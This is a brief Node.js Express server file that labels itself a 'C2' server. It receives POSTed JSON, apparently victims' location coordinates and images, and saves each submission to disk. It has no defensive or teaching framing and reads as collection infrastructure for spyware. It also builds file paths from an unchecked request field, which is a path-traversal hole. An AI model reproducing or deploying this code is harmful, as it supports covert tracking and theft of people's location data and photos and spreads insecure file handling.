// server.js
const express = require('express');
const fs = require('fs');
const app = express();
app.use(express.json({limit: '50mb'}));
app.use(express.static('.'));

app.post('/receive', (req, res) => {
    const data = req.body;
    fs.writeFileSync(`data/${Date.now()}_${data.type}.json`, JSON.stringify(data, null, 2));
    console.log(`📥 ${data.type}: ${data.lat || data.image ? 'OK' : 'data'}`);
    res.send('OK');
});

app.listen(3000, () => console.log('🚀 C2: http://localhost:3000'));
